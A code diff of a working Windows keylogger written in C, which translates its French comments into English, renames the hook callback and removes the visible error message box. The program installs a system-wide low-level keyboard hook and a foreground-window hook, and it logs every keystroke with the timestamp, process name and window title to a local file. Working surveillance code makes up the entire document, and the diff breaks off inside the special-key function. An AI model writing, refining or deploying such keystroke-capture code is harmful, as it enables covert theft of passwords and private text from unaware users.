@@ -10,72 +10,75 @@
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "Shlwapi.lib")
 
-// Variables globales
-HHOOK           g_keyboard_hook;
-HWINEVENTHOOK   g_window_hook;
-FILE*           g_logfile;
-HWND            g_last_window = NULL;           // Dernière fenêtre enregistrée
-HWND            g_foreground_window = NULL;     // Fenêtre en premier plan
-char            g_process_name[MAX_PATH] = "";  // Processus en premier plan
-char            g_window_title[256];            // Titre de la fenêtre en premier plan
+HHOOK           g_keyboard_hook;                // Handle for the keyboard hook.
+HWINEVENTHOOK   g_window_hook;                  // Handle for the window event hook.
+FILE*           g_logfile;                      // Pointer to the log file.
+HWND            g_last_window = NULL;           // Handle to the last recorded window.
+HWND            g_foreground_window = NULL;     // Handle to the current foreground window.
+char            g_process_name[MAX_PATH] = "";  // Name of the process currently in the foreground.
+char            g_window_title[256];            // Title of the current foreground window.
 
-// Prototypes de fonctions
-static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+static LRESULT CALLBACK handle_key_press(int nCode, WPARAM wParam, LPARAM lParam);
 static void CALLBACK handle_fg_window_change(HWINEVENTHOOK, DWORD, HWND, LONG, LONG, DWORD, DWORD);
 static void write_to_log(const char* str);
 static const char* get_special_key_name(DWORD vkCode);
 static const char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn);
 
-// Fonction principale
-int main(int argc, char *argv[])
+int main(int argc, char* argv[])
 {
     if (argc == 0 || argv[0] == NULL)
         return 1;
 
     char log_path[MAX_PATH] = { 0 };
+
+    // Get the full path of the executable file
+    // and then find the last backslash in the path
+    // to isolate the directory.
     GetModuleFileName(NULL, log_path, MAX_PATH);
     char* last_backslash = strrchr(log_path, '\\');
     if (last_backslash) {
         *last_backslash = '\0';
     }
-    // Construire le chemin complet vers keystrokes.log
+
+    // Construct the full path to the log file (keystrokes.log) in the same directory as the executable.
     snprintf(log_path, MAX_PATH, "%s\\keystrokes.log", log_path);
 
-    // Ouvrir le fichier log
+    // Open the log file for appending. Create it if it doesn't exist.
     g_logfile = fopen(log_path, "a");
     if (g_logfile == NULL) {
-        MessageBox(NULL, "Erreur d'ouverture du fichier log.", "Erreur", MB_ICONERROR);
         return 1;
     }
 
-    // Installer le hook
+    // Set a Windows event hook to monitor changes in the foreground window (e.g., when the active window changes).
     g_window_hook = SetWinEventHook(
-        EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,   // Range of events (0x3 to 0x3).
-        NULL,                                               // Handle to DLL.
-        handle_fg_window_change,                            // The callback.
-        0, 0,                                               // Process and thread IDs of interest (0 = all)
-        WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);   // Flags.
-    g_keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
+        EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,   // Monitor only foreground window change events.
+        NULL,                                               // No DLL handle is needed as the callback is in the same process.
+        handle_fg_window_change,                            // The callback function to handle window changes.
+        0, 0,                                               // Monitor all processes and threads.
+        WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);   // Flags to specify how the hook is managed.
+
+    // Set a low-level keyboard hook to monitor all keyboard events.
+    g_keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, handle_key_press, NULL, 0);
     if (g_keyboard_hook == NULL || g_window_hook == NULL) {
         fclose(g_logfile);
         return 1;
     }
 
-	// Initialiser la fenêtre et le processus en premier plan
-	handle_fg_window_change(NULL, 0, GetForegroundWindow(), 0, 0, 0, 0);
+    // Initialize by manually triggering the window change handler for the current foreground window.
+    handle_fg_window_change(NULL, 0, GetForegroundWindow(), 0, 0, 0, 0);
 
-    // Boucle de message
+    // Enter the message loop to keep the hooks active.
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {}
 
-    // Nettoyage
+    // Cleanup: Unhook the event and keyboard hooks and close the log file before exiting.
     UnhookWinEvent(g_window_hook);
     UnhookWindowsHookEx(g_keyboard_hook);
     fclose(g_logfile);
     return 0;
 }
 
-// Fonction pour retirer les brackets
+// Function to remove brackets from a string
 static void remove_brackets(char* str)
 {
     char* src = str;
@@ -90,69 +93,87 @@ static void remove_brackets(char* str)
     *dest = '\0';
 }
 
-// Fonction de hook pour capturer les frappes
-static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+static LRESULT CALLBACK handle_key_press(int nCode, WPARAM wParam, LPARAM lParam)
 {
+    // Check if the hook should process the event
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
-        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
-        char key[32] = { 0 };
+        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;  // Pointer to the keyboard event data
+        char key[32] = { 0 };  // Buffer to store the key or key combination
 
-        // Récupérer l'état du clavier
+        // Retrieve the current state of all virtual keys
         BYTE keyboardState[256];
         GetKeyboardState(keyboardState);
 
-        // Vérifier l'état de Shift et de Caps Lock
+        // Check if Shift is pressed and if Caps Lock is active
         BOOL isShiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
         BOOL isCapsLockOn = GetKeyState(VK_CAPITAL) & 0x0001;
 
-        if ((pKeyboard->vkCode >= 0x30 && pKeyboard->vkCode <= 0x5A) ||
-			pKeyboard->vkCode >= VK_OEM_1 && pKeyboard->vkCode <= VK_OEM_102 ||
-			pKeyboard->vkCode >= VK_NUMPAD0 && pKeyboard->vkCode <= VK_DIVIDE ||
-            pKeyboard->vkCode == VK_SPACE) {
-			strcpy(key, get_character(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, isShiftPressed, isCapsLockOn));
-		}
-		else { // La touche est une touche spéciale
-			strcpy(key, get_special_key_name(pKeyboard->vkCode));
+        // Check if the key is a printable character or a special key
+        if ((pKeyboard->vkCode >= 0x30 && pKeyboard->vkCode <= 0x5A) ||  // Alphanumeric keys
+            pKeyboard->vkCode >= VK_OEM_1 && pKeyboard->vkCode <= VK_OEM_102 ||  // OEM keys (e.g., punctuation)
+            pKeyboard->vkCode >= VK_NUMPAD0 && pKeyboard->vkCode <= VK_DIVIDE || // Numpad keys
+            pKeyboard->vkCode == VK_SPACE) {  // Space key
+            // Get the character representation of the key
+            strcpy(key, get_character(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, isShiftPressed, isCapsLockOn));
+        }
+        else {  // The key is a special key (e.g., F1, Tab)
+            // Get the special key name (e.g., "[Enter]", "[Tab]")
+            strcpy(key, get_special_key_name(pKeyboard->vkCode));
         }
 
-		if (strcmp(key, "") == 0) {
-			return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
-		}
+        // If no key was identified, pass the event to the next hook
+        if (strcmp(key, "") == 0) {
+            return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
+        }
 
-        // Gérer les combinaisons de touches (e.g., Ctrl+C)
+        // Handle key combinations (e.g., Alt+C, Ctrl+X)
         char tmp_key[32] = { 0 };
-        if (GetAsyncKeyState(VK_MENU) & 0x8000) {  // Alt key
-			remove_brackets(key);
-            sprintf(tmp_key, "[Alt+%s]", key);
-            strcpy(key, tmp_key);
+        if (GetAsyncKeyState(VK_MENU) & 0x8000) {  // If Alt key is pressed
+            remove_brackets(key);  // Remove brackets from key name if any
+            sprintf(tmp_key, "[Alt+%s]", key);  // Format the key combination as "Alt+key"
+            strcpy(key, tmp_key);  // Update key with the combination
         }
-        if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {
-			remove_brackets(key);
-            sprintf(tmp_key, "[Ctrl+%s]", key);
-			strcpy(key, tmp_key);
+        if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {  // If Ctrl key is pressed
+            remove_brackets(key);  // Remove brackets from key name if any
+            sprintf(tmp_key, "[Ctrl+%s]", key);  // Format the key combination as "Ctrl+key"
+            strcpy(key, tmp_key);  // Update key with the combination
         }
 
-        // Écrire la touche dans le fichier log
+        // Write the key or key combination to the log file
         write_to_log(key);
     }
+
+    // Pass the event to the next hook in the chain
     return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
 }
 
-// Fonction pour écrire dans le fichier log
 static void write_to_log(const char* str)
 {
+    // Check if the foreground window has changed since the last logged window
     if (g_foreground_window != g_last_window) {
-		// La fenêtre a changé, écrire le nom du processus et le titre de la fenêtre
+        // Update the last window to the current foreground window
         g_last_window = g_foreground_window;
+
+        // Get the current time
         time_t t = time(NULL);
         struct tm tm = *localtime(&t);
 
+        // Write a new entry to the log file with the timestamp, process name, and window title
         fprintf(g_logfile, "\n[%04d-%02d-%02d %02d:%02d:%02d] (%s) %s\n",
-            tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
-            tm.tm_hour, tm.tm_min, tm.tm_sec,
-            g_process_name, g_window_title);
+            tm.tm_year + 1900,   // Year (add 1900 to get the full year)
+            tm.tm_mon + 1,       // Month (tm_mon is 0-based, so add 1)
+            tm.tm_mday,          // Day of the month
+            tm.tm_hour,          // Hour
+            tm.tm_min,           // Minute
+            tm.tm_sec,           // Second
+            g_process_name,      // Name of the current foreground process
+            g_window_title);     // Title of the current foreground window
     }
+
+    // Log the key or string that was captured
     fprintf(g_logfile, "%s", str);
+
+    // Ensure all data is written to the file immediately
     fflush(g_logfile);
 }
 
@@ -168,53 +189,73 @@ static void CALLBACK handle_fg_window_change(
 {
     (void)hWinEventHook, event, idObject, idChild, idEventThread, dwmsEventTime;
 
-    // Obtenir le style de la fenêtre
+    // Get the extended window style to check the type of the window
     LONG_PTR exStyle = GetWindowLongPtr(hwnd, GWL_EXSTYLE);
 
-    // Vérifier si la fenêtre est une fenêtre utilitaire ou système
-	// J'ajoute cela afin d'eviter de log "Task Switching" lors de l'utilisation de ALT+TAB
+    // Check if the window is a tool window (often used for floating palettes, etc.)
+    // This is added to avoid logging "Task Switching" when using ALT+TAB
     if (exStyle & WS_EX_TOOLWINDOW) {
-        // C'est une fenêtre de type outil, probablement pas une fenêtre d'application principale
+        // If the window is a tool window, it's likely not the main application window
         return;
     }
 
-    // Obtenir la fenêtre et le processus en premier plan
+    // Update the global variable with the current foreground window handle
     g_foreground_window = hwnd;
+
+    // Retrieve the process ID associated with the foreground window
     DWORD pid;
     GetWindowThreadProcessId(g_foreground_window, &pid);
 
+    // Open the process to obtain its executable name
     HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
-    GetModuleFileNameEx(process, NULL, g_process_name, MAX_PATH);
-    strcpy(g_process_name, PathFindFileName(g_process_name));
-    CloseHandle(process);
+    if (process) {
+        // Get the full path to the executable file of the process
+        // and then extract just the file name from the full path
+        GetModuleFileNameEx(process, NULL, g_process_name, MAX_PATH);
+        strcpy(g_process_name, PathFindFileName(g_process_name));
 
+        CloseHandle(process);
+    }
+
+    // Get the title of the foreground window and store it in the global variable
     GetWindowText(hwnd, g_window_title, sizeof(g_window_title));
 }
 
 static const char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn)
 {
-    static char key[2] = { 0 }; // Static pour retourner un pointeur valide
-    HKL keyboardLayout = GetKeyboardLayout(0); // Obtient la disposition de clavier pour le thread actuel
+    static char key[2] = { 0 };
 
-    // Utiliser ToUnicodeEx pour gérer les locales et les dispositions de clavier
+    // Get the keyboard layout for the current thread.
+    HKL keyboardLayout = GetKeyboardLayout(0);
+
+    // Use ToUnicodeEx to translate the virtual key code and scan code into a Unicode character.
+    // This function takes into account the keyboard state (e.g., Shift, Caps Lock) and the
+    // keyboard layout, which is important for handling different locales and layouts.
     int result = ToUnicodeEx(vkCode, scanCode, keyboardState, (LPWSTR)key, sizeof(key), 0, keyboardLayout);
 
     if (result == 1) {
-        // Gestion des majuscules/minuscules
+        // If ToUnicodeEx successfully translated the key (returns 1 when exactly one character is generated),
+        // handle the case of uppercase and lowercase conversion based on Shift and Caps Lock states.
+
         if ((isShiftPressed && !isCapsLockOn) || (!isShiftPressed && isCapsLockOn)) {
+            // If either Shift is pressed without Caps Lock, or Caps Lock is on without Shift,
+            // convert the character to uppercase.
             key[0] = (char)toupper(key[0]);
         }
         else if (!isShiftPressed && !isCapsLockOn) {
+            // If neither Shift nor Caps Lock is active, ensure the character is lowercase.
             key[0] = (char)tolower(key[0]);
         }
     }
     else {
+        // If ToUnicodeEx did not return exactly one character, return a placeholder for an unknown key.
         return "[Unknown Key]";
     }
 
     return key;
 }
 
+// Function to get the name of special keys (e.g., F1, Tab, Enter)
 static const char* get_special_key_name(DWORD vkCode)
 {
     switch (vkCode) {
